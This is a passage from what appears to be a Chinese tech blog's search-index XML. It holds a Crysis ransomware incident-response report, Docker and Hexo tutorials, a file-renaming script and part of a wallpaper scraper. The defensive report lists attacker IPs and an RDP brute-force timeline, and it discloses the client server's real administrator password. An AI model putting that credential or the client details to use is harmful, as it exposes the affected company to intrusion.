class="line">23.27.103.198</span><br><span class="line">23.27.103.219</span><br><span class="line">23.27.117.179</span><br><span class="line">23.27.117.187</span><br><span class="line">23.27.117.190</span><br><span class="line">23.27.126.154</span><br><span class="line">50.117.40.78</span><br><span class="line">50.117.40.81</span><br><span class="line">50.117.40.85</span><br><span class="line">69.46.80.176</span><br><span class="line">69.46.80.186</span><br><span class="line">113.121.166.74</span><br><span class="line">117.90.0.28</span><br><span class="line">117.91.209.137</span><br><span class="line">117.95.26.92</span><br><span class="line">121.40.20.81</span><br><span class="line">173.245.77.205</span><br><span class="line">205.164.1.197</span><br><span class="line">205.164.1.199</span><br><span class="line">205.164.1.207</span><br><span class="line">205.164.1.208</span><br><span class="line">205.164.1.210</span><br><span class="line">205.164.26.66</span><br><span class="line">205.164.26.81</span><br><span class="line">205.164.26.94</span><br><span class="line">216.172.155.132</span><br><span class="line">216.172.155.148</span><br><span class="line">216.172.155.155</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>勒索病毒应急响应</title>
      <link href="/p/f5fc.html"/>
      <url>/p/f5fc.html</url>
      
        <content type="html"><![CDATA[<p>几天前接到一家网络教育公司的应急请求，总结下。</p><span id="more"></span><h1 id="症状"><a href="#症状" class="headerlink" title="症状"></a>症状</h1><p>服务器经过检查后确认感染的勒索病毒为Crysis家族V4变种，由于CrySiS家族采用AES+RSA的加密方式，目前尚无私钥流出，因此目前无法解密。</p><h1 id="涉及到的客户资产"><a href="#涉及到的客户资产" class="headerlink" title="涉及到的客户资产"></a>涉及到的客户资产</h1><ul><li><p>主机名：WIN-HOXXXXXIG</p></li><li><p>服务器IP：182.XXX.XXX.119</p></li><li><p>操作系统：Windows Server 2008 R2 Enterprise</p></li></ul><h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p><strong>由于之前发生过多起勒索+挖矿攻击事件，因此首先对客户机器的状况进行检测</strong></p><h2 id="系统状况检查"><a href="#系统状况检查" class="headerlink" title="系统状况检查"></a>系统状况检查</h2><p>CPU、内存、网络占用率均为正常水平，无挖矿行为痕迹</p><p><img src="/images/image001-1554996878750.png" alt="image001"></p><h2 id="系统进程检查"><a href="#系统进程检查" class="headerlink" title="系统进程检查"></a>系统进程检查</h2><p>经过wmic 命令获取进程信息及procexp 检查，除自启动勒索信息外，初步判定操作系统无异常进程</p><p><img src="/images/image002.png" alt="image002"></p><h2 id="系统服务检查"><a href="#系统服务检查" class="headerlink" title="系统服务检查"></a>系统服务检查</h2><p>通过对系统服务进行检查，未发现恶意服务</p><h2 id="系统启动项检查"><a href="#系统启动项检查" class="headerlink" title="系统启动项检查"></a>系统启动项检查</h2><p>对操作系统相关位置进行检查后，除自启动勒索信息外，未发现恶意启动项</p><p><img src="/images/image003.png" alt="image003"></p><h3 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h3><p>除勒索信息外，注册表无异常启动项</p><p><img src="/images/image004.png" alt="image004"></p><p><img src="/images/image005.png" alt="image005"></p><p><img src="/images/image006.png" alt="image006"></p><h3 id="启动项"><a href="#启动项" class="headerlink" title="启动项"></a>启动项</h3><p>除勒索信息外，无异常启动项</p><p><img src="/images/image007.png" alt="image007"></p><p><img src="/images/image008.png" alt="image008"></p><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>除广告程序外，无异常计划任务</p><p><img src="/images/image009.png" alt="image009"></p><h3 id="系统文件"><a href="#系统文件" class="headerlink" title="系统文件"></a>系统文件</h3><p>除勒索信息外，系统文件无异常，无Crysis家族释放的文件</p><p><img src="/images/image010.png" alt="image010"></p><h3 id="系统账户检查"><a href="#系统账户检查" class="headerlink" title="系统账户检查"></a>系统账户检查</h3><p>在注册表中发现异常账户</p><p><img src="/images/image011.png" alt="image011"></p><p><img src="/images/image012.png" alt="image012"></p><p><img src="/images/image013.png" alt="image013"></p><h3 id="网络连接与防火墙配置检查"><a href="#网络连接与防火墙配置检查" class="headerlink" title="网络连接与防火墙配置检查"></a>网络连接与防火墙配置检查</h3><p>未发现异常现象</p><p><img src="/images/image014.png" alt="image014"></p><p><img src="/images/1554996412584.png" alt="1554996412584"></p><h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><p>通过对操作系统日志进行分析，发现在<code>2019年4月6日</code>下午2点前有大量远程桌面登录失败的日志，判定为暴力破解账号密码植入的勒索病毒，同时发现在<code>2019年4月7日</code>有IP为<code>121.207.227.69</code>（中国福建泉州）的机器对服务器进行了暴力破解账号密码，IP为<code>141.98.252.166</code>（英国伦敦）与<code>59.63.182.243</code>（中国江西南昌）分别于<code>2019年4月5日21时26分</code>和<code>2019年4月5日5时33分</code>成功登录了服务器。</p><p> <img src="/images/image016.png" alt="image016"></p><p>成功登录服务器</p><p><img src="/images/1554997063124.png" alt="1554997063124"></p><p><img src="/images/1554997084598.png" alt="1554997084598"></p><p>同时提取到IP<code> 141.98.252.166</code>在<code>2019/4/5 21:26:18</code>到<code>2019/4/5 22:55:16</code>期间多次登录并注销远程连接</p><p><img src="/images/image020.png" alt="image020"></p><p><img src="/images/image019.png" alt="image019">   </p><h1 id="三、发现的问题及处置意见"><a href="#三、发现的问题及处置意见" class="headerlink" title="三、发现的问题及处置意见"></a>三、发现的问题及处置意见</h1><p>在应急响应过程中发现多处服务器配置问题，具体如下：</p><ol><li><p>服务器开启了IPC$文件共享服务</p></li><li><p>服务器管理员账户密码为弱口令</p></li><li><p>服务器操作系统存在<em>EternalBlue</em> (MS17-010)高危漏洞</p></li></ol><h2 id="处置意见"><a href="#处置意见" class="headerlink" title="处置意见"></a>处置意见</h2><ol><li><p>IPC$文件共享服务为高危服务，历史上发生过多起通过该服务入侵的案例，如非必须，建议关闭该服务，如需要该服务，建议进行严格的权限管控。</p></li><li><p>服务器密码为zxcv!@34，属于键盘顺序弱口令，建议更换。</p></li><li><p><strong>EternalBlue</strong>(在微软漏洞编号MS17-010中被修复)是在Windows的SMB服务处理SMB v1请求时发生的漏洞，这个漏洞导致攻击者在目标系统上可以执行任意代码，微软官方补丁编号<strong>KB 4013389</strong>，建议立即安装。</p></li><li><p>鉴于服务器操作已被勒索病毒破坏，系统完整性已缺失，建议进行备份重要文件后重新安装操作系统并执行处置意见中的1~3步。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker中的RUN CMD和ENTRYPOINT</title>
      <link href="/p/7f07.html"/>
      <url>/p/7f07.html</url>
      
        <content type="html"><![CDATA[<p>总结下Docker中的RUN CMD和ENTRYPOINT区别</p><span id="more"></span><table><thead><tr><th align="center">命令</th><th align="center">用途</th><th align="center">备注</th></tr></thead><tbody><tr><td align="center">RUN</td><td align="center">执行命令并创建新的镜像层</td><td align="center">在当前镜像的顶部执行命令，并通过创建新的镜像层，经常用于安装软件包，Dockerfile 中常常包含<strong>多个</strong> <code>RUN </code>指令</td></tr><tr><td align="center">CMD</td><td align="center">设置容器启动后默认执行的命令及其参数</td><td align="center">此命令会在容器启动且 <code>docker run </code><strong>没有指定其他命令时运行</strong>(CMD 能够被 <code>docker run</code> 后面跟的命令行参数替换)</td></tr><tr><td align="center">ENTRYPOINT</td><td align="center">配置容器启动时运行的命令</td><td align="center">让容器以应用程序或者服务的形式运行</td></tr></tbody></table><h1 id="RUN"><a href="#RUN" class="headerlink" title="RUN"></a>RUN</h1><p>RUN 指令通常用于安装应用和软件包。</p><p>RUN 在当前镜像的顶部执行命令，并通过创建新的镜像层。Dockerfile 中常常包含多个 RUN 指令。</p><p>RUN 有两种格式：</p><ol><li>Shell 格式：<code>RUN</code></li><li>Exec 格式：<code>RUN [&quot;executable&quot;, &quot;param1&quot;, &quot;param2&quot;]</code></li></ol><p>下面是使用 RUN 安装多个包的例子：</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; apt-get install -y \  </span></span><br><span class="line"> bzr \</span><br><span class="line"> cvs \</span><br><span class="line"> git \</span><br><span class="line"> mercurial \</span><br><span class="line"> subversion</span><br></pre></td></tr></table></figure><p>注意：<strong>apt-get update 和 apt-get install 被放在一个 RUN 指令中执行</strong>，这样能够保证每次安装的是最新的包。如果 apt-get install 在单独的 RUN 中执行，则会使用 apt-get update 创建的镜像层，而这一层可能是很久以前缓存的。</p><h1 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h1><p>CMD 指令允许用户指定容器的默认执行的命令。</p><p>此命令会在容器启动且 docker run 没有指定其他命令时运行。</p><ol><li>如果 <code>docker run </code>指定了其他命令，CMD 指定的默认命令将被忽略。</li><li>如果 <code>Dockerfile </code>中有多个 CMD 指令，<strong>只有最后一个 CMD 有效。</strong></li></ol><p>CMD 有三种格式：</p><ol><li>Exec 格式：<code>CMD [&quot;executable&quot;,&quot;param1&quot;,&quot;param2&quot;]</code><br>这是 CMD 的推荐格式。</li></ol><p>2.<code> CMD [&quot;param1&quot;,&quot;param2&quot;]</code> 为 ENTRYPOINT 提供额外的参数，此时 ENTRYPOINT 必须使用 Exec 格式。<br>3. Shell 格式：<code>CMD command param1 param2</code></p><p>Exec 和 Shell 格式前面已经介绍过了。<br>第二种格式 <code>CMD [&quot;param1&quot;,&quot;param2&quot;] </code>要与 Exec 格式 的 ENTRYPOINT 指令配合使用，其用途是为 ENTRYPOINT 设置默认的参数。我们将在后面讨论 ENTRYPOINT 时举例说明。</p><p>下面看看 CMD 是如何工作的。Dockerfile 片段如下：</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CMD</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;Hello world&quot;</span></span></span><br></pre></td></tr></table></figure><p>运行容器 <code>docker run -it [image] </code>将输出：<code>Hello world</code></p><p>但当后面加上一个命令，比如<code> docker run -it [image] /bin/bash</code>，CMD 会被<strong>忽略</strong>掉，命令 bash 将被执行：</p><p><code>root@10a32dc7d3d3:/#</code></p><h1 id="ENTRYPOINT"><a href="#ENTRYPOINT" class="headerlink" title="ENTRYPOINT"></a>ENTRYPOINT</h1><p><code>ENTRYPOINT </code>指令可让容器以应用程序或者服务的形式运行。</p><p><code>ENTRYPOINT </code>看上去与 CMD 很像，它们都可以指定要执行的命令及其参数。不同的地方在于 <code>ENTRYPOINT </code>不会被忽略，一定会被执行，即使运行 <code>docker run </code>时指定了其他命令。</p><p><code>ENTRYPOINT </code>有两种格式：</p><ol><li>Exec 格式：<code>ENTRYPOINT [&quot;executable&quot;, &quot;param1&quot;, &quot;param2&quot;] </code>这是 ENTRYPOINT 的推荐格式。</li><li>Shell 格式：<code>ENTRYPOINT command param1 param2</code></li></ol><p>在为<code>ENTRYPOINT</code>选择格式时必须小心，因为这两种格式的效果差别很大。</p><h2 id="Exec-格式"><a href="#Exec-格式" class="headerlink" title="Exec 格式"></a>Exec 格式</h2><p><code>ENTRYPOINT</code> 的 <code>Exec</code> 格式用于设置要执行的命令及其参数，同时可通过 CMD 提供额外的参数。</p><p><code>ENTRYPOINT</code> 中的参数始终会被使用，而 CMD 的额外参数可以在容器启动时动态替换掉。</p><p>比如下面的 Dockerfile 片段：</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;/bin/echo&quot;</span>, <span class="string">&quot;Hello&quot;</span>]  </span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;world&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>当容器通过 <code>docker run -it [image]</code> 启动时，输出为：<code>Hello world</code></p><p>而如果通过 <code>docker run -it [image] CloudMan </code>启动，则输出为：<code>Hello CloudMan</code></p><h2 id="Shell-格式"><a href="#Shell-格式" class="headerlink" title="Shell 格式"></a>Shell 格式</h2><p><code>ENTRYPOINT </code>的 <code>Shell </code>格式会忽略任何<code>CMD</code>或<code>docker run</code>提供的参数。</p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo Indigo主题添加友链</title>
      <link href="/p/fa5b.html"/>
      <url>/p/fa5b.html</url>
      
        <content type="html"><![CDATA[<p>Indigo主题是一款HEXO的基于material设计的主题，个人比较喜欢material设计的主题，由于之前硬盘损坏且没有备份原主题<code>material</code>，于是换上了Indigo，但是没有友链功能，抽了点时间加上了。</p><span id="more"></span><h1 id="新建文件"><a href="#新建文件" class="headerlink" title="新建文件"></a>新建文件</h1><p>首先，在<code>\hexo\blog\themes\indigo\layout</code>下新建<code>links.ejs</code>和<code>link.ejs</code></p><p>代码如下</p><p><code>links.ejs</code></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;%- partial(&#x27;_partial/header&#x27;, &#123;</span><br><span class="line">    title: locals.title || theme.links_title,</span><br><span class="line">    hdClass: &#x27;links-header&#x27;</span><br><span class="line">&#125;) %&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container body-wrap fade&quot;</span>&gt;</span></span><br><span class="line">    &lt;% if (theme.links &amp;&amp; theme.links.length) &#123; %&gt;</span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">&quot;archive-separator&quot;</span>&gt;</span></span><br><span class="line">        &lt;%=theme.links_title%&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;waterfall&quot;</span>&gt;</span></span><br><span class="line">        &lt;% theme.links.forEach(function(links) &#123; %&gt;</span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;waterfall-item&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">article</span> <span class="attr">class</span>=<span class="string">&quot;article-card archive-article&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">&quot;post-title&quot;</span> <span class="attr">itemprop</span>=<span class="string">&quot;name&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;post-title-link&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&lt;%- links.url %&gt;&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">itemprop</span>=<span class="string">&quot;url&quot;</span>&gt;</span></span><br><span class="line">                        &lt;%- links.name %&gt;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">article</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        &lt;%&#125;)%&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    &lt;% &#125;%&gt;</span><br><span class="line">    &lt;%- partial(&#x27;_partial/paginator&#x27;) %&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/V8UFiNW.png" alt="如图"></p><p><code>link.ejs</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%- partial(&#x27;links&#x27;, &#123;</span><br><span class="line">    title: theme.links_title + &#x27;: &#x27;+ page.tag</span><br><span class="line">&#125;) %&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/KEPMTDJ.png" alt="如图"></p><h1 id="更改CSS"><a href="#更改CSS" class="headerlink" title="更改CSS"></a>更改CSS</h1><p>然后在<code>cmd/shell</code>中执行<code>hexo new page &#39;Links&#39;</code>，然后到<code>\hexo\blog\source\Links</code>更改<code>index.md</code>为如下内容</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">layout: links</span><br><span class="line">comments: false</span><br><span class="line"></span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>接着在<code>\hexo\blog\themes\indigo\source\css\_partial</code>的<code>header.less</code>搜索</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.tags-header</span>,</span><br><span class="line"><span class="selector-class">.categories-header</span></span><br></pre></td></tr></table></figure><p>更改为</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.tags-header</span>,</span><br><span class="line"><span class="selector-class">.categories-header</span>,</span><br><span class="line"><span class="selector-class">.links-header</span> </span><br></pre></td></tr></table></figure><p><img src="/images/bgbVlHY.png" alt="如图"></p><h1 id="config-yml设置"><a href="#config-yml设置" class="headerlink" title="config.yml设置"></a>config.yml设置</h1><p>在<strong>主题</strong>的<code>config.yml</code>中设置<code>menu</code>项，去除<code>link</code>前面的注释</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">link:</span></span><br><span class="line">  <span class="attr">text:</span> <span class="string">测试</span></span><br><span class="line">  <span class="attr">url:</span> <span class="string">/Links</span></span><br></pre></td></tr></table></figure><p><img src="/images/fCmtfmQ.png" alt="如图"></p><p>在<strong>主题</strong>的<code>config.yml</code>中设置<code># 页面标题</code>项，添加</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">links_title:</span> <span class="string">友情链接</span></span><br></pre></td></tr></table></figure><p><img src="/images/Jl5iYlS.png" alt="如图"></p><p>最后，在<strong>主题</strong>的<code>config.yml</code>最后添加<code>links</code>项目，格式如下</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#友链</span></span><br><span class="line"><span class="comment">#links:</span></span><br><span class="line"><span class="comment">#  - name: 名称</span></span><br><span class="line"><span class="comment">#  - url: 链接</span></span><br><span class="line"><span class="attr">links:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;名称&quot;</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&quot;链接&quot;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;名称&quot;</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&quot;链接&quot;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;名称&quot;</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&quot;链接&quot;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;名称&quot;</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&quot;链接&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/images/ft1JSYE.png" alt="如图"></p><p>最终修改的文件如下<br><img src="/images/cDK4uAr.png"></p><p>然后<code>cmd/shell</code>执行<code>hexo g</code>重新生成页面</p><p>预览截图<br><img src="/images/Bgo9UZt.png" alt="预览截图"></p>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>批量去除后缀脚本</title>
      <link href="/p/a483.html"/>
      <url>/p/a483.html</url>
      
        <content type="html"><![CDATA[<p>批量去除一个文件夹目录下的文件后缀的脚本</p><span id="more"></span><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@Description: </span></span><br><span class="line"><span class="string">@Author: Sp4ce</span></span><br><span class="line"><span class="string">@Github: https://github.com/NS-Sp4ce</span></span><br><span class="line"><span class="string">@LastEditors: Sp4ce</span></span><br><span class="line"><span class="string">@Date: 2019-03-23 23:37:27</span></span><br><span class="line"><span class="string">@LastEditTime: 2019-03-23 23:58:22</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getFileExt</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27; 获取指定目录下的所有指定后缀的文件名 &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    f_list = os.listdir(path)</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> f_list:</span><br><span class="line">        fileName=file</span><br><span class="line">        <span class="comment">#print(fileName)</span></span><br><span class="line">        file_ext=os.path.splitext(file)[-<span class="number">1</span>]</span><br><span class="line">        <span class="comment">#print(file_ext)</span></span><br><span class="line">        <span class="comment">#print(os.path.splitext(file)[0])</span></span><br><span class="line">        <span class="keyword">if</span> file_ext == <span class="string">&#x27;.下载&#x27;</span>: <span class="comment">#指定后缀</span></span><br><span class="line">            reNameFileExt(fileName)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reNameFileExt</span>(<span class="params">fileName</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27; 去除后缀&#x27;&#x27;&#x27;</span> </span><br><span class="line">    newFileName = os.path.splitext(fileName)[<span class="number">0</span>]</span><br><span class="line">    oldFileName=path +<span class="string">&#x27;\\&#x27;</span> +fileName</span><br><span class="line">    changeFileName= path +<span class="string">&#x27;\\&#x27;</span> +newFileName</span><br><span class="line">    os.rename(oldFileName,changeFileName)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    path = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    getFileExt(path)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wallhaven.cc 小爬虫</title>
      <link href="/p/8b64.html"/>
      <url>/p/8b64.html</url>
      
        <content type="html"><![CDATA[<p>一个月前无意中发现个壁纸站wallhaven.cc，写了个小爬虫挂服务器上了。</p><span id="more"></span><p>直接上代码吧</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@Description: wallhaven.cc Spider</span></span><br><span class="line"><span class="string">@Author: Sp4ce</span></span><br><span class="line"><span class="string">@Github: https://github.com/NS-Sp4ce</span></span><br><span class="line"><span class="string">@Date: 2019-02-12 20:20:48</span></span><br><span class="line"><span class="string">@LastEditors: Sp4ce</span></span><br><span class="line"><span class="string">@LastEditTime: 2019-02-12 20:40:41</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">USER_AGENTS 随机头信息</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">USER_AGENTS = [</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; 